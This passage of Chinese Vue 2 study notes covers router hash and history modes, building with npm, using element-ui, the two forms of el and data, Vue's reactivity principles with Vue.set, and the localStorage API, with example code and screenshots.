## 13、路由器的两种工作模式 hash 和 history0

1. 对于一个url来说，什么是hash值？—— #及其后面的内容就是hash值。
2. hash值不会包含在 HTTP 请求中，即：hash值不会带给服务器。
3. hash模式： 
   1. 地址中永远带着#号，不美观 。
   2. 若以后将地址通过第三方手机app分享，若app校验严格，则地址会被标记为不合法。
   3. 兼容性较好。
4. history模式： 
   1. 地址干净，美观 。
   2. 兼容性和hash模式相比略差。
   3. 应用部署上线时需要后端人员支持，解决刷新页面服务端404的问题。

![image.png](https://www.yue-hai.top:10300/file/downloadFile?fullFilePath=%2Fhome%2Fyan%2F%E6%A1%8C%E9%9D%A2%2F%E5%86%85%E5%AD%98%2F%E6%96%87%E6%A1%A3%E8%B5%84%E6%96%99%2FTakeDown%2FWeb%2FJS%20%E6%A1%86%E6%9E%B6%2Fattachments%2F2023-07-25-12--51-01-238--a6bwN8HjbREfsg.png)

```javascript
// 引入 vue
import Vue from 'vue'
// 引入 路由 vue-router
import VueRouter from 'vue-router'
// 应用 路由 vue-router
Vue.use(VueRouter)

// 引入组件
import Home from '@/pages/Home.vue'
import About from '@/pages/About.vue'
import Yuehai from '@/pages/yuehai/yuehai.vue'
import yan from '@/pages/yuehai/yan.vue'
import Detail from '@/pages/yuehai/detail/Detail.vue'

// 创建一个路由器
const router = new VueRouter({
    // 配置路由工作模式，默认为 hash
    mode: 'history',
    // 配置路由
    routes: [
        // 一级路由
        {
            name: 'home',
            path: '/home',
            component: Home,
            meta: { isAuth: false, title: '主页' },
            // 二级路由，path 不要加 /
            children: [
                { name: 'yuehai', path: 'yuehai', component: Yuehai, meta: { isAuth: true, title: '月海' }, children: [
                    /**
                     * 三级路由，path 不要加 /
                     * detail/:id/:title：params 路径传参，:id：占位符
                     *
                     * props的第一种写法：props:{a:1,b:'hello'}，值为对象，该对象中的所有 key-value 都会以 props 的形式传给 Detail 组件
                     * props的第二种写法：props: true，值为布尔值，若布尔值为真，就会把该路由组件收到的所有 params 参数，以 props 的形式传给 Detail 组件
                     * props的第三种写法：值为函数；此为一个回调函数，vue 调用时会将 $route 传进来
                     */
                    {
                        name: 'detail',
                        path: 'detail',
                        // name: 'detail',
                        component: Detail,
                        meta: { isAuth: true, title: '详情' },
                        props($route){
                            return { id: $route.query.id, title: $route.query.title }
                        }
                    }
                ] },
                { name: 'yan', path: 'yan', component: yan, meta: { isAuth: true, title: '言' } }
            ]
        },
        {
            name: 'about',
            path: '/about',
            component: About,
            meta: { isAuth: false, title: '关于' },
        },
    ]
})

/**
 * 全局后置路由守卫；在每一次路由切换之后都会执行此函数
 * to：到哪里去
 * from：从哪里来
 */
router.afterEach((to, from)=>{
    // 设置浏览器标签显示的名称
    document.title = to.meta.title || "月海"
})

// 暴露
export default router
```

# 八、打包部署

1. 打包：`npm run build`，会生成 dist 目录

![image.png](https://www.yue-hai.top:10300/file/downloadFile?fullFilePath=%2Fhome%2Fyan%2F%E6%A1%8C%E9%9D%A2%2F%E5%86%85%E5%AD%98%2F%E6%96%87%E6%A1%A3%E8%B5%84%E6%96%99%2FTakeDown%2FWeb%2FJS%20%E6%A1%86%E6%9E%B6%2Fattachments%2F2023-07-25-12--51-01-399--v2vJdi0_5PwSyA.png)

# 九、UI 组件库的基本使用

- 移动端常用U组件库
1. Vant：[https://youzan.github.io/vant](https://youzan.github.io/vant)
2. Cube Ul：[https://didi.github.io/cube-ui](https://didi.github.io/cube-ui)
3. Mint Ul：[http://mint-ui.github.io](http://mint-ui.github.io)
- PC端常用U组件库
1. Element-Ul：[https://element.eleme.cn](https://element.eleme.cn)
2. IView Ul：[https://www.iviewui.com](https://www.iviewui.com)

## 1、element-ui

### ①、完整引入

1. 安装：`npm i element-ui -S`
2. 在 main.js 中引入；完整引入

```javascript
// 引入 vue
import Vue from 'vue'
// 引入 app 组件，他是所有组件的父组件
import App from './App.vue'
// 引入 ElementUI
import ElementUI from 'element-ui';
// 引入 ElementUI 全部样式
import 'element-ui/lib/theme-chalk/index.css';

// 引入 路由 router
import router from './router'

// 引入 ElementUI
Vue.use(ElementUI);

// 创建 vue 实例对象
// $mount('#app') 等价于：el: '#app'，他的原型对象
new Vue({
    // 将 app 组件放入容器中；
    render: h => h(App),
    // 使用路由
    router
}).$mount('#app')

```

3. 使用：

![image.png](https://www.yue-hai.top:10300/file/downloadFile?fullFilePath=%2Fhome%2Fyan%2F%E6%A1%8C%E9%9D%A2%2F%E5%86%85%E5%AD%98%2F%E6%96%87%E6%A1%A3%E8%B5%84%E6%96%99%2FTakeDown%2FWeb%2FJS%20%E6%A1%86%E6%9E%B6%2Fattachments%2F2023-07-25-12--51-01-488--VMSeauzS4bFUow.png)

4. 效果

![image.png](https://www.yue-hai.top:10300/file/downloadFile?fullFilePath=%2Fhome%2Fyan%2F%E6%A1%8C%E9%9D%A2%2F%E5%86%85%E5%AD%98%2F%E6%96%87%E6%A1%A3%E8%B5%84%E6%96%99%2FTakeDown%2FWeb%2FJS%20%E6%A1%86%E6%9E%B6%2Fattachments%2F2023-07-25-12--51-01-782--sBrSQ1CyF1fXkw.png)

### ②、按需引入

1. 安装：`npm i element-ui -S`
2. 安装 babel-plugin-component：`npm install babel-plugin-component -D`
3. 修改  `.babelrc（babel.config.js）` 文件

```javascript
module.exports = {
    presets: [
        '@vue/cli-plugin-babel/preset',
        ["@babel/preset-env", {"modules": false}]
    ],
    plugins: [
        [
            "component",
            {
                "libraryName": "element-ui",
                "styleLibraryName": "theme-chalk"
            }
        ]
    ]
}

```

4. 在 main.js 中引入；按需引入

```javascript
// 引入 vue
import Vue from 'vue'
// 引入 app 组件，他是所有组件的父组件
import App from './App.vue'
// 引入 路由 router
import router from './router'
// 按需引入 Button、 Select
import { Button, Select } from 'element-ui';

// 引入 ElementUI
Vue.use(Button);
Vue.use(Select);

// 创建 vue 实例对象
// $mount('#app') 等价于：el: '#app'，他的原型对象
new Vue({
    // 将 app 组件放入容器中；
    render: h => h(App),
    // 使用路由
    router
}).$mount('#app')

```

5. 使用：

![image.png](https://www.yue-hai.top:10300/file/downloadFile?fullFilePath=%2Fhome%2Fyan%2F%E6%A1%8C%E9%9D%A2%2F%E5%86%85%E5%AD%98%2F%E6%96%87%E6%A1%A3%E8%B5%84%E6%96%99%2FTakeDown%2FWeb%2FJS%20%E6%A1%86%E6%9E%B6%2Fattachments%2F2023-07-25-12--51-01-970--Bg3cpqmqF-ca2A.png)

6. 效果

![image.png](https://www.yue-hai.top:10300/file/downloadFile?fullFilePath=%2Fhome%2Fyan%2F%E6%A1%8C%E9%9D%A2%2F%E5%86%85%E5%AD%98%2F%E6%96%87%E6%A1%A3%E8%B5%84%E6%96%99%2FTakeDown%2FWeb%2FJS%20%E6%A1%86%E6%9E%B6%2Fattachments%2F2023-07-25-12--51-01-984--hWAfTVNXPie78w.png)

# 十、其他问题

## 1、`el` 与 `data` 的两种写法

由Vue管理的函数，一定不要写箭头函数，一旦写了箭头函数，this就不再是Vue实例了。

### ①、`el`的两种写法

1. new Vue 时候配置 el 属性。
2. 先创建 Vue 实例，随后再通过 `vm.$mount('#root')` 指定 el 的值。

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <!-- 引入 vue -->
    <script src="../js/vue.js"></script>
</head>
<body>
    
    <!-- 准备一个 vue 容器 -->
    <div id="root">
        <p>{{name}}</p>
    </div>

</body>

<script>
    // 阻止 vue 在启动时生成开发版提示
    Vue.config.productionTip = false;

    // 创建 vue 实例，并将实例赋值给 v
    const v = new Vue({
        // el 用于指定当前 vue 实例为哪个容器服务，值通常为 css 选择器字符串
        // el: '#root',
        // data 中用于存储数据，数据供 el 所指定的容器去使用
        data: {
            name: '月海',
            bilibiliURL: 'https://www.bilibili.com/'
        }
    });

    // 打印 vue 实例
    console.log(v);

    // 页面加载 2 秒后，再指定容器
    setTimeout(() => {
        // 调用 vue 实例，指定容器；挂载
        v.$mount('#root')
    }, 2000);

</script>

</html>
```

![image.png](https://www.yue-hai.top:10300/file/downloadFile?fullFilePath=%2Fhome%2Fyan%2F%E6%A1%8C%E9%9D%A2%2F%E5%86%85%E5%AD%98%2F%E6%96%87%E6%A1%A3%E8%B5%84%E6%96%99%2FTakeDown%2FWeb%2FJS%20%E6%A1%86%E6%9E%B6%2Fattachments%2F2023-07-25-12--51-01-990--Pxmre1X24TDN8A.png)

![image.png](https://www.yue-hai.top:10300/file/downloadFile?fullFilePath=%2Fhome%2Fyan%2F%E6%A1%8C%E9%9D%A2%2F%E5%86%85%E5%AD%98%2F%E6%96%87%E6%A1%A3%E8%B5%84%E6%96%99%2FTakeDown%2FWeb%2FJS%20%E6%A1%86%E6%9E%B6%2Fattachments%2F2023-07-25-12--51-02-146---WOyqfs_AtCUbA.png)

### ②、`data` 的两种写法

1. 对象式
2. 函数式
3. 如何选择：目前哪种写法都可以，以后学习到组件时，data 必须使用函数式，否则会报错。		

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <!-- 引入 vue -->
    <script src="../js/vue.js"></script>
</head>
<body>
    
    <!-- 准备一个 vue 容器 -->
    <div id="root">
        <p>{{name}}</p>
    </div>

</body>

<script>
    // 阻止 vue 在启动时生成开发版提示
    Vue.config.productionTip = false;

    // 创建 vue 实例，并将实例赋值给 v
    const v = new Vue({
        // el 用于指定当前 vue 实例为哪个容器服务，值通常为 css 选择器字符串
        el: '#root',

        // data 中用于存储数据，数据供 el 所指定的容器去使用
        // data 的第 1 种写法，对象形式
        // data: {
        //     name: '月海',
        //     bilibiliURL: 'https://www.bilibili.com/'
        // }

        // data 的第 2 种写法，函数形式
        data() {
            // 此处的 this 是 vue 实例（所以不能写箭头函数）
            console.log(this);
            return {
                name: '月海'
            }
        },
    });

</script>

</html>
```

![image.png](https://www.yue-hai.top:10300/file/downloadFile?fullFilePath=%2Fhome%2Fyan%2F%E6%A1%8C%E9%9D%A2%2F%E5%86%85%E5%AD%98%2F%E6%96%87%E6%A1%A3%E8%B5%84%E6%96%99%2FTakeDown%2FWeb%2FJS%20%E6%A1%86%E6%9E%B6%2Fattachments%2F2023-07-25-12--51-02-237--4HKZkktsa6ariw.png)

## 2、vue 监测数据的原理

1. vue会监视 data 中所有层次的数据
2. 如何监测对象中的数据？通过setter实现监视，且要在 new Vue 时就传入要监测的数据。
   1. 对象中后追加的属性，Vue默认不做响应式处理
   2. 如需给后添加的属性做响应式，请使用如下API：`Vue.set(target，propertyName/index，value)` 或 `vm.$set(target，propertyName/index，value)`
3. 如何监测数组中的数据？通过包裹数组更新元素的方法实现，本质就是做了两件事：
   1. 调用原生对应（添加、修改等）的方法对数组进行更新
   2. 重新解析模板，进而更新页面。
4. 在Vue修改数组中的某个元素一定要用如下方法：
   1. 使用这些 API：`push()、pop()、shift()、unshift()、splice()、sort()、reverse()`
   2. `Vue.set()` 或 `vm.$set()`
5. 特别注意：`Vue.set()` 和 `vm.$set()` 不能给 vm 或 vm 的根数据对象 添加属性！！！

---

### ①、简单模拟对象数据监测

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>Document</title>
	</head>
	<body>
		<script type="text/javascript" >
            // 数据
			let data = {
				name:'尚硅谷',
				address:'北京',
			}
		
            // 封装监视处理 data 数据的函数
			function Observer(obj){
				// 汇总对象中所有的属性形成一个数组
				const keys = Object.keys(obj)
				// 遍历
				keys.forEach((k)=>{
                    // 给函数 Observer 的实例化对象中的属性（本次遍历的属性）添加 get、set 方法
					Object.defineProperty(this,k,{
						get(){
							return obj[k]
						},
						set(val){
							console.log(`${k}被改了，我要去解析模板，生成虚拟DOM.....我要开始忙了`)
                            // 被修改时将会调用该 set 方法， 将修改的值赋值给对应的属性
							obj[k] = val
						}
					})
				})
			}
			
			// 创建一个监视的实例对象，用于监视 data 中属性的变化（调用封装的函数）
			const obs = new Observer(data);

			//准备一个vm实例对象
			let vm = {};
            // 将新实例赋值给 vm 实例对象中的 _data
			vm._data = obs;

		</script>
	</body>
</html>
```

### ②、给后添加的属性做响应式 `Vue.set(target，propertyName/index，value)`

- `Vue.set` 只能给 `data` 中某个对象里添加属性，不允许直接向 `data（根数据对象）` 中添加属性

```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <!-- 引入 vue -->
    <script src="../js/vue.js"></script>
</head>

<body>
    <div id="root">
        <p>姓名：{{person.name}}</p>
        <p>年龄：{{person.age}}</p>
        <p>性别：{{person.sex}}</p>
    </div>

</body>

<script>
    // 阻止 vue 在启动时生成开发版提示
    Vue.config.productionTip = false;

    const vm = new Vue({
        el: '#root',
        // 数据
        data: {
            person: {
                name: '月海',
            }
        }
    });

    // 添加响应式属性
    // 参数 1：要添加属性到哪个对象
    // 参数 2：添加的属性名
    // 参数 3：添加的属性值
    Vue.set(vm.person, 'age', 14)

</script>

</html>
```

![image.png](https://www.yue-hai.top:10300/file/downloadFile?fullFilePath=%2Fhome%2Fyan%2F%E6%A1%8C%E9%9D%A2%2F%E5%86%85%E5%AD%98%2F%E6%96%87%E6%A1%A3%E8%B5%84%E6%96%99%2FTakeDown%2FWeb%2FJS%20%E6%A1%86%E6%9E%B6%2Fattachments%2F2023-07-25-12--51-02-400--K2c7oObV3pX74A.png)

### ③、如何监测数组中的数据

![image.png](https://www.yue-hai.top:10300/file/downloadFile?fullFilePath=%2Fhome%2Fyan%2F%E6%A1%8C%E9%9D%A2%2F%E5%86%85%E5%AD%98%2F%E6%96%87%E6%A1%A3%E8%B5%84%E6%96%99%2FTakeDown%2FWeb%2FJS%20%E6%A1%86%E6%9E%B6%2Fattachments%2F2023-07-25-12--51-02-518---EhkkpBjgdpHZw.png)

![image.png](https://www.yue-hai.top:10300/file/downloadFile?fullFilePath=%2Fhome%2Fyan%2F%E6%A1%8C%E9%9D%A2%2F%E5%86%85%E5%AD%98%2F%E6%96%87%E6%A1%A3%E8%B5%84%E6%96%99%2FTakeDown%2FWeb%2FJS%20%E6%A1%86%E6%9E%B6%2Fattachments%2F2023-07-25-12--51-02-686--3Hn6Pn6Ie0D6hw.png)

### ④、总结

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>总结数据监视</title>
		<style>
			button{
				margin-top: 10px;
			}
		</style>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!--
			Vue监视数据的原理：
				1. vue会监视data中所有层次的数据。

				2. 如何监测对象中的数据？
								通过setter实现监视，且要在new Vue时就传入要监测的数据。
									(1).对象中后追加的属性，Vue默认不做响应式处理
									(2).如需给后添加的属性做响应式，请使用如下API：
													Vue.set(target，propertyName/index，value) 或 
													vm.$set(target，propertyName/index，value)

				3. 如何监测数组中的数据？
									通过包裹数组更新元素的方法实现，本质就是做了两件事：
										(1).调用原生对应的方法对数组进行更新。
										(2).重新解析模板，进而更新页面。

				4.在Vue修改数组中的某个元素一定要用如下方法：
							1.使用这些API:push()、pop()、shift()、unshift()、splice()、sort()、reverse()
							2.Vue.set() 或 vm.$set()
				
				特别注意：Vue.set() 和 vm.$set() 不能给vm 或 vm的根数据对象 添加属性！！！
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<h1>学生信息</h1>
			<button @click="student.age++">年龄+1岁</button> <br/>
			<button @click="addSex">添加性别属性，默认值：男</button> <br/>
			<button @click="student.sex = '未知' ">修改性别</button> <br/>
			<button @click="addFriend">在列表首位添加一个朋友</button> <br/>
			<button @click="updateFirstFriendName">修改第一个朋友的名字为：张三</button> <br/>
			<button @click="addHobby">添加一个爱好</button> <br/>
			<button @click="updateHobby">修改第一个爱好为：开车</button> <br/>
			<button @click="removeSmoke">过滤掉爱好中的抽烟</button> <br/>
			<h3>姓名：{{student.name}}</h3>
			<h3>年龄：{{student.age}}</h3>
			<h3 v-if="student.sex">性别：{{student.sex}}</h3>
			<h3>爱好：</h3>
			<ul>
				<li v-for="(h,index) in student.hobby" :key="index">
					{{h}}
				</li>
			</ul>
			<h3>朋友们：</h3>
			<ul>
				<li v-for="(f,index) in student.friends" :key="index">
					{{f.name}}--{{f.age}}
				</li>
			</ul>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		const vm = new Vue({
			el:'#root',
			data:{
				student:{
					name:'tom',
					age:18,
					hobby:['抽烟','喝酒','烫头'],
					friends:[
						{name:'jerry',age:35},
						{name:'tony',age:36}
					]
				}
			},
			methods: {
				addSex(){
					// Vue.set(this.student,'sex','男')
					this.$set(this.student,'sex','男')
				},
				addFriend(){
					this.student.friends.unshift({name:'jack',age:70})
				},
				updateFirstFriendName(){
					this.student.friends[0].name = '张三'
				},
				addHobby(){
					this.student.hobby.push('学习')
				},
				updateHobby(){
					// this.student.hobby.splice(0,1,'开车')
					// Vue.set(this.student.hobby,0,'开车')
					this.$set(this.student.hobby,0,'开车')
				},
				removeSmoke(){
					this.student.hobby = this.student.hobby.filter((h)=>{
						return h !== '抽烟'
					})
				}
			}
		})
	</script>
</html>
```

## 3、本地存储 `localStorage`

1. 存储内容大小一般支持5MB左右（不同浏览器可能还不一样）
2. 浏览器端通过 Window.sessionStorage 和 Window.localStorage 属性来实现本地存储机制。
3. 相关API：
   1. 保存：`localStorage.setItem('key', 'value')`
   2. 读取：`localStorage.getItem('key')`
   3. 删除：`localStorage.removeItem('key')`
   4. 清空：`localStorage.clear()`
4.  备注： 
   1. SessionStorage 存储的内容会随着浏览器窗口关闭而消失。
   2. LocalStorage 存储的内容，需要手动清除才会消失。
   3. `xxxxxStorage.getItem(xxx)`如果 xxx 对应的 value 获取不到，那么 getItem 的返回值是 null。
   4. `JSON.parse(null)`的结果依然是 null。

## 4、
## 5、
